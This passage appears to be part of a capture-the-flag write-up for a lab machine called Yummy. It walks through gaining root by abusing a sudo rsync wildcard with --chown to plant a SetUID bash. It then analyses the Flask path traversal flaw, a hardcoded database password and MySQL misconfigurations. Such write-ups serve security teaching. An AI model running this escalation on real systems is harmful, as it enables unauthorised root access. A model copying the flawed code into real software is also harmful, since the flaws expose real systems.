drwx------ 2 dev  dev  4096 Sep 30 07:20 .cache
drwx------ 3 dev  dev  4096 May 28 16:24 .gnupg
-rw-rw-r-- 1 dev  dev   729 May 29 15:08 .hgrc
-rw-r--r-- 1 root root    0 May 27 06:14 .hushlogin
drwxrwxr-x 5 dev  dev  4096 May 15 13:21 .local
-rw-r--r-- 1 dev  dev   807 Mar 31  2024 .profile
drwx------ 2 dev  dev  4096 May 28 15:02 .ssh

```

The `.ssh` folder is empty. `.hgrc` looks just like qa’s. `app-production` looks just like the `/opt/app` folder.

#### sudo

dev does have the rights to run an `rsync` command as root:

```

dev@yummy:~/app-production$ sudo -l
Matching Defaults entries for dev on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev may run the following commands on localhost:
    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/

```

### Exploit

This `rsync` command lets dev sync files from `app-production` to `/opt/app`. The issue is the `*`, which allows for whatever I want to add there. I’ll be using the `--chown` flag to set the copied files to be owned by root. Interestingly, the `chown` command removes the SetUID and SetGID bits, but the `--chown` flag in `rsync` doesn’t.

`app-production` seems to be getting blown away and recreated on a loop (likely a HTB cleanup), so I’ll want to work from outside of the directory rather than in it.

I’ll start by making a SetUID copy of `bash` in the `app-production` directory:

```

dev@yummy:~$ cp /bin/bash app-production/0xdf
dev@yummy:~$ chmod 6777 app-production/0xdf

```

Now I’ll sync it, setting the owner:

```

dev@yummy:~$ sudo rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/
dev@yummy:~$ ls -l /opt/app/0xdf 
-rwsrwsrwx 1 root root 1446024 Oct 10 17:52 /opt/app/0xdf

```

I’ll run with `-p` to hold privs as root:

```

dev@yummy:~$ /opt/app/0xdf -p
0xdf-5.2#

```

And grab the flag:

```

0xdf-5.2# cat root.txt
088531b8************************

```

## Beyond Root

### Vulnerable Python Code

The `/book` endpoint gets the data from the client, generates a calendar invite file, and adds the booking to the database:

```

@app.route('/book', methods=['GET', 'POST'])
def export():
    if request.method == 'POST':
        try:
            name = request.form['name']
            date = request.form['date']
            time = request.form['time']
            email = request.form['email']
            num_people = request.form['people']
            message = request.form['message']

            filename = generate_ics_file(name, date, time, email, num_people, message)
            flash('Your booking request was sent. You can manage your appointment further from your account. Thank you!', 'success')
            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "INSERT INTO appointments (appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s)"
                    cursor.execute(sql, (email, date, time, num_people, message, 'customer'))
                    connection.commit()
            except Exception as e:
                print(e)

            return redirect(url_for('export_file', filename=filename))
        except ValueError:
            flash('Error processing your request. Please try again.', 'error')
    return render_template('index.html')

```

The interesting part is the call to `generate_ics_file`, which is defined here:

```

def generate_ics_file(name, date, time, email, num_people, message):
    global temp_dir
    temp_dir = tempfile.mkdtemp()
    current_date_time = datetime.now()
    formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")

    cal = Calendar()
    event = Event()

    event.name = name
    event.begin = datetime.strptime(date, "%Y-%m-%d")
    event.description = f"Email: {email}\nNumber of People: {num_people}\nMessage: {message}"

    cal.events.add(event)

    # Sanitize and validate the file name
    safe_filename = quote(f'Yummy_reservation_{formatted_date_time}.ics')
    temp_file_path = os.path.join(temp_dir, safe_filename)

    # Ensure the path is within the temp_dir
    if not temp_file_path.startswith(temp_dir):
        raise ValueError("Invalid file path")
    with open(temp_file_path, 'w') as fp:
        fp.write(cal.serialize())

    return os.path.basename(temp_file_path)

```

This is really bad design. It’s using a global variable to track the current `temp_dir`, which is created each time `generate_ics_file` is called. There are a few uses cases where a global makes sense, but in general, not only should they be avoided, but if you are trying to use one, your code is probably structured in a bad way.

Later, when `/export/filename` is called, it uses the `temp_dir` global as what is to be cleaned up:

```

@app.route('/export/<path:filename>')
def export_file(filename):
    filepath = os.path.join(temp_dir, filename)
    if os.path.exists(filepath):
        content = send_file(filepath, as_attachment=True)
        shutil.rmtree(temp_dir)
        return content
    else:
        shutil.rmtree(temp_dir)
        return "File not found", 404

```

Again, this makes no sense. Why not just create files in a constant directory and delete the file by name?

Still, this explains why I’m not able to call `/export` a second time. On the first time, it deletes the current value of `temp_dir`. So when it reaches the line `shutil.rmtree(temp_dir)` (deleting the directory), this will error out as that directory doesn’t exist. That means `content` is never returned.

The file read vulnerability is in the `/export` code above, specifically taking user input (in the URL) and passing it to `os.path.join`. By adding `../` in the URL, I am able to traverse into other directories and read other files.

### MySQL Misconfigurations

#### Stacked Queries

Stacked queries in SQL are when you have multiple distinct queries run in a single submission. By default, MySQL doesn’t allow stacked queries. This is actually the MySQL client that doesn’t allow stacked queries. The client can be configured to allow these.

In most cases where SQL injection is involved, the “client” is the webserver making queries to the database. So in this case, the configuration is made in the Python code. In `app.py`, towards the top, it defines the `db_config` dictionary:

```

db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS
}

```

Later, when a connection to the DB is required, it creates a client with:

```

connection = pymysql.connect(**db_config)

```

On the [Connection Object](https://pymysql.readthedocs.io/en/latest/modules/connections.html) page for PyMySQL, it shows that `client_flag` is:

> - **client\_flag** – Custom flags to send to MySQL. Find potential values in constants.CLIENT.

The flag for `CLIENT.MULTI_STATEMENTS` is what allows stacked queries in this application.

#### secure\_file\_priv

There are a few protections in place to prevent MySQL from writing files on modern Ubuntu. By default, MySQL won’t do it. To enable this, Yummy has added this line to `/etc/mysql/mysql.conf.d/mysqld.cnf`:

```

secure_file_priv=""

```

This option is documented [here](https://dev.mysql.com/doc/refman/8.4/en/server-system-variables.html#sysvar_secure_file_priv), including:

> [`secure_file_priv`](https://dev.mysql.com/doc/refman/8.4/en/server-system-variables.html#sysvar_secure_file_priv) may be set as follows:
>
> - If empty, the variable has no effect. This is not a secure setting.
> - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
> - If set to `NULL`, the server disables import and export operations.

Empty is not a secure setting!

#### AppArmor

[AppArmor](https://ubuntu.com/server/docs/apparmor) runs by default on Ubuntu, and would also block this file write. I’ll verify that I can write a file to `/data/scripts` just like above. The `apparmor` service is not running:

```

root@yummy:~# systemctl status apparmor.service 
○ apparmor.service - Load AppArmor profiles
     Loaded: loaded (/usr/lib/systemd/system/apparmor.service; disabled; preset: enabled)
     Active: inactive (dead)
       Docs: man:apparmor(7)
             https://gitlab.com/apparmor/apparmor/wikis/home/

```

I’ll start it, and also restart the `mysql` service:

```

root@yummy:~# systemctl start apparmor.service 
root@yummy:~# systemctl restart mysql.service 

```

When I try the same injection, there’s an error:

![image-20250219085804739](/img/image-20250219085804739.png)

The block is logged as well:

```

root@yummy:~# cat /var/log/laurel/audit.log | grep fixer-v224.sh | grep DENIED | jq .
{
  "ID": "1739973564.659:2866",
  "AVC": [
    {
      "apparmor": "DENIED",
      "operation": "mknod",
      "class": "file",
      "profile": "/usr/sbin/mysqld",
      "name": "/data/scripts/fixer-v224.sh",
      "pid": 2534,
      "comm": "connection",
      "requested_mask": "c",
      "denied_mask": "c",
      "fsuid": 110,
      "ouid": 110,
      "FSUID": "mysql",
      "OUID": "mysql"
    }
  ],
  "SYSCALL": {
    "arch": "0xc000003e",
    "syscall": 257,
    "success": "no",
    "exit": -13,
    "items": 1,
    "ppid": 1,
    "pid": 2534,
    "auid": 4294967295,
    "uid": 110,
    "gid": 110,
    "euid": 110,
    "suid": 110,
    "fsuid": 110,
    "egid": 110,
    "sgid": 110,
    "fsgid": 110,
    "tty": "(none)",
    "ses": 4294967295,
    "comm": "connection",
    "exe": "/usr/sbin/mysqld",
    "subj": "/usr/sbin/mysqld",
    "key": null,
    "ARCH": "x86_64",
    "SYSCALL": "openat",
    "AUID": "unset",
    "UID": "mysql",
    "GID": "mysql",
    "EUID": "mysql",
    "SUID": "mysql",
    "FSUID": "mysql",
    "EGID": "mysql",
    "SGID": "mysql",
    "FSGID": "mysql",
    "ARGV": [
      "0xffffff9c",
      "0x7dc048a0df48",
      "0xc1",
      "0x1a0"
    ],
    "PPID": {
      "comm": "systemd",
      "exe": "/usr/lib/systemd/systemd"
    }
  },
  "PATH": [
    {
      "item": 0,
      "name": "/data/scripts/",
      "inode": 3323,
      "dev": "fc:00",
      "mode": "0o40777",
      "ouid": 0,
      "ogid": 0,
      "rdev": "00:00",
      "nametype": "PARENT",
      "cap_fp": "0x0",
      "cap_fi": "0x0",
      "cap_fe": 0,
      "cap_fver": "0x0",
      "cap_frootid": "0",
      "OUID": "root",
      "OGID": "root"
    }
  ],
  "PROCTITLE": {
    "ARGV": [
      "/usr/sbin/mysqld"
    ]
  }
}

```

Interestingly, even after enabling AppArmor, MySQL is able to write to `/tmp`.